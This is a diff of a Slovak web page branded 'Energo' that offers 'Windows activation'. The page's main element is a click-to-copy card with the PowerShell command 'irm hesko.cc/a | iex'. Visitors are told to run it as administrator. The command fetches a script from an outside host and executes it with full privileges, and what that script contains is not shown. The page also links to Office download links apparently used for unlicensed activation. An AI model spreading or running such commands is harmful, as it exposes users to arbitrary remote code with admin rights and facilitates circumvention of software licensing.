@@ -1,167 +1,347 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="sk">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PowerShell Script</title>
-    <style>
-        :root {
-            --bg: #0c0c0d;
-            --panel: #111113;
-            --text: #e6e6e8;
-            --muted: #b6b6bb;
-            --accent: #e11d2e;
-            --border: #1e1f22;
-            --radius: 14px;
-            --shadow: 0 10px 30px rgba(0,0,0,.35);
-            --font: ui-sans-serif, system-ui, -apple-system, "Segoe UI", Roboto, Ubuntu, Cantarell, "Noto Sans", "Helvetica Neue", Arial, "Apple Color Emoji", "Segoe UI Emoji";
-        }
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Aktivácia | Energo</title>
+  <meta name="description" content="Aktivácia – Energo">
+  <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 64 64'%3E%3Crect width='64' height='64' rx='12' fill='%230a0a0a'/%3E%3Cpath d='M32 8L18 36h10l-4 20 18-28H32l4-20z' fill='%23e11d2e'/%3E%3C/svg%3E" />
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Outfit:wght@300;500;700;900&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --bg: #08080a;
+      --surface: #0e0e11;
+      --surface-2: #131316;
+      --border: #1a1a1f;
+      --border-light: #242429;
+      --text: #e8e8ec;
+      --text-2: #9898a0;
+      --accent: #e11d2e;
+      --accent-dim: rgba(225, 29, 46, .12);
+      --radius: 16px;
+      --font: 'Outfit', sans-serif;
+      --mono: 'JetBrains Mono', monospace;
+    }
 
-        * {
-            box-sizing: border-box;
-        }
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    html { height: 100%; }
 
-        html, body {
-            height: 100%;
-            margin: 0;
-            padding: 0;
-        }
+    body {
+      min-height: 100%;
+      background: var(--bg);
+      color: var(--text);
+      font-family: var(--font);
+      line-height: 1.5;
+      -webkit-font-smoothing: antialiased;
+      display: flex;
+      flex-direction: column;
+    }
 
-        body {
-            background: linear-gradient(180deg, #0a0a0a 0%, #0e0e10 100%);
-            color: var(--text);
-            font-family: var(--font);
-            line-height: 1.5;
-            -webkit-font-smoothing: antialiased;
-            text-rendering: optimizeLegibility;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            min-height: 100vh;
-        }
+    /* ========== HEADER ========== */
+    header {
+      padding: 20px 24px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      border-bottom: 1px solid var(--border);
+      background: rgba(8, 8, 10, .8);
+      backdrop-filter: blur(12px);
+      position: sticky;
+      top: 0;
+      z-index: 50;
+    }
 
-        .container {
-            text-align: center;
-            padding: 20px;
-        }
+    .brand {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      text-decoration: none;
+      color: var(--text);
+    }
 
-        .command-box {
-            background: linear-gradient(180deg, #111113, #0f0f11);
-            border: 1px solid var(--border);
-            border-radius: var(--radius);
-            padding: 24px 32px;
-            box-shadow: var(--shadow);
-            cursor: pointer;
-            transition: all 0.3s ease;
-            margin-bottom: 16px;
-            display: inline-block;
-            min-width: 400px;
-        }
+    .brand svg { width: 28px; height: 28px; }
 
-        .command-box:hover {
-            border-color: var(--accent);
-            box-shadow: 0 0 0 2px rgba(225, 29, 46, 0.18);
-            transform: translateY(-2px);
-        }
+    .brand-name {
+      font-weight: 900;
+      font-size: 18px;
+      letter-spacing: .5px;
+    }
 
-        .command-text {
-            font-family: 'Courier New', monospace;
-            font-size: 18px;
-            font-weight: 700;
-            color: var(--text);
-            user-select: none;
-            letter-spacing: 0.5px;
-        }
+    .back-link {
+      padding: 8px 16px;
+      border-radius: 10px;
+      font-weight: 500;
+      font-size: 14px;
+      color: var(--text-2);
+      text-decoration: none;
+      transition: color .15s, background .15s;
+    }
 
-        .instruction {
-            color: var(--muted);
-            font-size: 14px;
-            font-weight: 600;
-            margin-top: 8px;
-        }
+    .back-link:hover {
+      color: var(--text);
+      background: var(--surface-2);
+    }
 
-        .copied-notification {
-            position: fixed;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            background: var(--accent);
-            color: white;
-            padding: 12px 24px;
-            border-radius: 8px;
-            font-weight: 700;
-            opacity: 0;
-            transition: opacity 0.3s ease;
-            z-index: 1000;
-        }
+    /* ========== MAIN ========== */
+    main {
+      flex: 1;
+      max-width: 560px;
+      width: 100%;
+      margin: 0 auto;
+      padding: 0 20px;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+    }
 
-        .copied-notification.show {
-            opacity: 1;
-        }
+    @keyframes fadeUp {
+      from { opacity: 0; transform: translateY(8px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
 
-        @media (max-width: 520px) {
-            .command-box {
-                min-width: auto;
-                width: 100%;
-                padding: 20px 24px;
-            }
-            
-            .command-text {
-                font-size: 16px;
-            }
-        }
-    </style>
+    .content {
+      padding: 48px 0 64px;
+      animation: fadeUp .3s ease;
+      display: flex;
+      flex-direction: column;
+      gap: 24px;
+    }
+
+    /* ========== COMMAND BOX ========== */
+    .section-heading {
+      font-size: 13px;
+      font-weight: 500;
+      color: var(--text-2);
+      letter-spacing: 2px;
+      text-transform: uppercase;
+      margin-bottom: 12px;
+    }
+
+    .command-card {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+      padding: 24px;
+      cursor: pointer;
+      transition: border-color .15s, transform .15s;
+    }
+
+    .command-card:hover {
+      border-color: var(--accent);
+      transform: translateY(-2px);
+    }
+
+    .command-card:active {
+      transform: translateY(0);
+    }
+
+    .command-text {
+      font-family: var(--mono);
+      font-size: 18px;
+      font-weight: 700;
+      text-align: center;
+      user-select: none;
+      letter-spacing: .5px;
+    }
+
+    .command-hint {
+      text-align: center;
+      font-size: 13px;
+      color: var(--text-2);
+      font-weight: 500;
+      margin-top: 10px;
+    }
+
+    /* ========== OFFICE LINK ========== */
+    .link-card {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 16px;
+      padding: 18px 20px;
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+      text-decoration: none;
+      color: var(--text);
+      transition: border-color .15s;
+    }
+
+    .link-card:hover {
+      border-color: var(--accent);
+    }
+
+    .link-left {
+      display: flex;
+      align-items: center;
+      gap: 14px;
+    }
+
+    .link-icon {
+      width: 40px;
+      height: 40px;
+      border-radius: 10px;
+      background: var(--surface-2);
+      border: 1px solid var(--border);
+      display: grid;
+      place-items: center;
+      flex-shrink: 0;
+    }
+
+    .link-icon svg {
+      width: 18px;
+      height: 18px;
+      color: var(--text-2);
+    }
+
+    .link-name {
+      font-weight: 700;
+      font-size: 15px;
+    }
+
+    .link-value {
+      font-size: 13px;
+      color: var(--text-2);
+      font-weight: 300;
+    }
+
+    .link-arrow {
+      color: var(--text-2);
+      font-size: 18px;
+      transition: transform .15s;
+    }
+
+    .link-card:hover .link-arrow {
+      transform: translateX(3px);
+    }
+
+    /* ========== NOTIFICATION ========== */
+    .notification {
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%) scale(.9);
+      background: var(--accent);
+      color: white;
+      padding: 12px 24px;
+      border-radius: 10px;
+      font-weight: 700;
+      font-size: 15px;
+      opacity: 0;
+      pointer-events: none;
+      transition: opacity .2s, transform .2s;
+      z-index: 1000;
+    }
+
+    .notification.show {
+      opacity: 1;
+      transform: translate(-50%, -50%) scale(1);
+    }
+
+    /* ========== FOOTER ========== */
+    footer {
+      text-align: center;
+      padding: 24px 20px 32px;
+      border-top: 1px solid var(--border);
+      color: var(--text-2);
+      font-size: 13px;
+      font-weight: 300;
+    }
+
+    footer .accent {
+      color: var(--accent);
+      font-weight: 700;
+    }
+
+    @media (max-width: 500px) {
+      header { padding: 16px; }
+      main { padding: 0 16px; }
+      .content { padding: 32px 0 48px; }
+      .command-text { font-size: 15px; }
+    }
+  </style>
 </head>
 <body>
-    <div class="container">
-        <div class="command-box" onclick="copyToClipboard()">
-            <div class="command-text">irm hesko.cc/a | iex</div>
+
+  <header>
+    <a class="brand" href="/">
+      <svg viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <rect width="32" height="32" rx="8" fill="#0e0e11"/>
+        <path d="M16 4L9 18h5l-2 10 9-14h-5l2-10z" fill="#e11d2e"/>
+      </svg>
+      <span class="brand-name">Energo</span>
+    </a>
+    <a class="back-link" href="/">Spat</a>
+  </header>
+
+  <main>
+    <div class="content">
+
+      <!-- ACTIVATION COMMAND -->
+      <div>
+        <div class="section-heading">Aktivacia Windows</div>
+        <div class="command-card" id="cmdBox">
+          <div class="command-text">irm hesko.cc/a | iex</div>
         </div>
-        <div class="instruction">spustiť v powershelly ako admin</div>
-    </div>
+        <div class="command-hint">Klikni pre skopirovanie · spustit v PowerShell ako admin</div>
+      </div>
 
-    <div class="container">
-        <div class="command-box">
-            <div class="command-text"><a href="https://massgrave.dev/office_c2r_links">Office</a></div>
-        </div>
-        <div class="instruction">Link na stiahnutie Office</div>
-    </div>
-    
-    <div class="copied-notification" id="notification">
-        Skopírované!
-    </div>
+      <!-- OFFICE DOWNLOAD -->
+      <div>
+        <div class="section-heading">Office</div>
+        <a class="link-card" href="https://massgrave.dev/office_c2r_links" target="_blank" rel="noopener noreferrer">
+          <div class="link-left">
+            <div class="link-icon">
+              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/>
+                <polyline points="7 10 12 15 17 10"/>
+                <line x1="12" x2="12" y1="15" y2="3"/>
+              </svg>
+            </div>
+            <div>
+              <div class="link-name">Stiahnut Office</div>
+              <div class="link-value">massgrave.dev/office_c2r_links</div>
+            </div>
+          </div>
+          <span class="link-arrow">&rsaquo;</span>
+        </a>
+      </div>
 
-    <script>
-        function copyToClipboard() {
-            const text = "irm hesko.cc/a | iex";
-            
-            navigator.clipboard.writeText(text).then(function() {
-                showNotification();
-            }).catch(function(err) {
-                // Fallback pre starší prehliadače
-                const textArea = document.createElement("textarea");
-                textArea.value = text;
-                document.body.appendChild(textArea);
-                textArea.focus();
-                textArea.select();
-                try {
-                    document.execCommand('copy');
-                    showNotification();
-                } catch (err) {
-                    console.error('Chyba pri kopírovaní:', err);
-                }
-                document.body.removeChild(textArea);
-            });
-        }
+    </div>
+  </main>
 
-        function showNotification() {
-            const notification = document.getElementById('notification');
-            notification.classList.add('show');
-            
-            setTimeout(function() {
-                notification.classList.remove('show');
-            }, 2000);
-        }
-    </script>
+  <div class="notification" id="notification">Skopirovane!</div>
+
+  <footer>
+    <span class="accent">&#9889;</span> Energo &middot; &copy; <span id="year"></span>
+  </footer>
+
+  <script>
+  (() => {
+    document.getElementById('year').textContent = new Date().getFullYear();
+
+    const cmd = 'irm hesko.cc/a | iex';
+    const box = document.getElementById('cmdBox');
+    const notif = document.getElementById('notification');
+
+    box.addEventListener('click', () => {
+      navigator.clipboard.writeText(cmd).then(show).catch(() => {
+        const ta = document.createElement('textarea');
+        ta.value = cmd;
+        document.body.appendChild(ta);
+        ta.select();
+        try { document.execCommand('copy'); show(); } catch(e) {}
+        document.body.removeChild(ta);
+      });
+    });
+
+    function show() {
+      notif.classList.add('show');
+      setTimeout(() => notif.classList.remove('show'), 1500);
+    }
+  })();
+  </script>
 </body>
 </html>
